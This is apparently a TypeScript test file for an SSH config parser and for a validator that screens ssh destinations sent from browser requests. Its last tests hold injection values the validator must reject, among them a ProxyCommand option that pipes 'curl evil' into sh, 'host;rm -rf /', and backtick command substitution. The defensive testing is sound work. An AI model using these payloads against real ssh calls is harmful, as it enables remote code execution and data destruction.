import { parseSshConfig, matches } from "../sshConfig.ts";
import { isSafeDestination } from "../remote.ts";

let pass = 0;
let fail = 0;

function eq(label: string, got: unknown, want: unknown) {
  const ok = JSON.stringify(got) === JSON.stringify(want);
  if (ok) pass++;
  else fail++;
  console.log(
    `${ok ? "  ok  " : " FAIL "} ${label}\n        got  ${JSON.stringify(got)}\n        want ${JSON.stringify(want)}`,
  );
}

const aliases = (text: string) => parseSshConfig(text).hosts.map((h) => h.alias);

eq(
  "one host, fully specified",
  parseSshConfig("Host build\n  HostName 10.0.0.4\n  User adri\n  Port 2222\n").hosts,
  [{ alias: "build", hostName: "10.0.0.4", user: "adri", port: 2222 }],
);

eq("keywords are case insensitive", parseSshConfig("HOST build\n  hostname h\n").hosts, [
  { alias: "build", hostName: "h", user: null, port: null },
]);

eq("an equals sign separates too", parseSshConfig("Host=build\nHostName=h\n").hosts, [
  { alias: "build", hostName: "h", user: null, port: null },
]);

eq("spaces around the equals", parseSshConfig("Host = build\n  HostName = h\n").hosts, [
  { alias: "build", hostName: "h", user: null, port: null },
]);

eq("values may be quoted", parseSshConfig('Host "build"\n  User "a d"\n').hosts, [
  { alias: "build", hostName: null, user: "a d", port: null },
]);

// ssh takes the FIRST value for a keyword, not the last. The natural
// implementation gets this backwards.
eq(
  "first value wins",
  parseSshConfig("Host build\n  HostName first\n  HostName second\n").hosts,
  [{ alias: "build", hostName: "first", user: null, port: null }],
);

eq(
  "a repeated alias keeps its first block",
  parseSshConfig("Host build\n  HostName first\nHost build\n  HostName second\n").hosts,
  [{ alias: "build", hostName: "first", user: null, port: null }],
);

// Patterns configure other entries; they are not somewhere to connect.
eq("wildcards never reach the list", aliases("Host *\n  User adri\n"), []);
eq("partial wildcards either", aliases("Host *.internal\n"), []);
eq("single-character wildcards either", aliases("Host build?\n"), []);
eq("negations either", aliases("Host !build\n"), []);

eq("one line can name several hosts", aliases("Host build deploy\n"), ["build", "deploy"]);
eq(
  "and configures all of them",
  parseSshConfig("Host build deploy\n  User adri\n").hosts.map((h) => h.user),
  ["adri", "adri"],
);
eq("a wildcard among literals is dropped", aliases("Host build * deploy\n"), [
  "build",
  "deploy",
]);

eq("comments and blank lines", aliases("# a comment\n\nHost build\n   # another\n"), ["build"]);

// A Match block's keywords belong to whatever it matches, decided at connect
// time. Attributing them to the preceding Host would mislabel it.
eq(
  "a Match block ends the preceding host",
  parseSshConfig("Host build\n  User adri\nMatch host other\n  User wrong\n").hosts,
  [{ alias: "build", hostName: null, user: "adri", port: null }],
);

eq("keywords before any Host are ignored", aliases("User adri\nHost build\n"), ["build"]);

eq("a bad port is not a port", parseSshConfig("Host b\n  Port nope\n").hosts[0].port, null);
eq("a negative port is not a port", parseSshConfig("Host b\n  Port -1\n").hosts[0].port, null);

// ProxyCommand contains an "=" well after its first space; the separator is
// whichever comes first, or the keyword would parse as "proxycommand ssh -w %h".
eq(
  "the first separator wins",
  parseSshConfig("Host b\n  ProxyCommand ssh -W %h:%p jump\n  User adri\n").hosts,
  [{ alias: "b", hostName: null, user: "adri", port: null }],
);

eq("includes are collected", parseSshConfig("Include conf.d/*\nHost b\n").includes, [
  "conf.d/*",
]);
eq("several includes on one line", parseSshConfig("Include a b\n").includes, ["a", "b"]);

eq("an empty config has no hosts", parseSshConfig("").hosts, []);
eq("a keyword with no value is skipped", aliases("Host\nHost build\n"), ["build"]);

// `Include ~/.ssh/config.d/*` is the standard idiom; treating it as a literal
// filename found nothing and hid the whole feature.
eq("a star matches anything", matches("work", "*"), true);
eq("a star with a prefix", matches("config-work", "config-*"), true);
eq("a star does not cross a separator", matches("a/b", "a*"), false);
eq("a question mark is one character", matches("cfg1", "cfg?"), true);
eq("and only one", matches("cfg12", "cfg?"), false);
eq("a dot is a dot, not any character", matches("configXd", "config.d"), false);
eq("an exact name still matches", matches("config.d", "config.d"), true);
eq("no accidental substring match", matches("myconfig", "config"), false);

eq("a wildcard does not match a dotfile", matches(".config.swp", "*"), false);
eq("nor a prefixed one", matches(".bak", "conf*"), false);
eq("unless the pattern is explicit about it", matches(".keep", ".*"), true);

// The ssh destination reaches the engine from a POST any page in the browser
// can make, and goes straight into ssh's argv, where there is no quoting to
// hide behind.
eq("a plain alias", isSafeDestination("build"), true);
eq("user@host", isSafeDestination("adri@adri-web.dev"), true);
eq("an address", isSafeDestination("adri@10.0.0.4"), true);
eq("bracketed IPv6", isSafeDestination("[fe80::1]"), true);

eq("a leading dash is an ssh option", isSafeDestination("-oProxyCommand=x"), false);
eq("the ProxyCommand attack", isSafeDestination('-oProxyCommand=sh -c "curl evil|sh"'), false);
eq("no spaces", isSafeDestination("host with space"), false);
eq("no shell metacharacters", isSafeDestination("host;rm -rf /"), false);
eq("no backticks", isSafeDestination("host`id`"), false);
eq("no pipes", isSafeDestination("host|sh"), false);
eq("no newlines", isSafeDestination("host\nother"), false);
eq("not empty", isSafeDestination(""), false);

console.log(`\n${pass} passed, ${fail} failed`);
// exitCode, not exit(): exit() can abort a queued stdout write on Windows.
process.exitCode = fail === 0 ? 0 : 1;
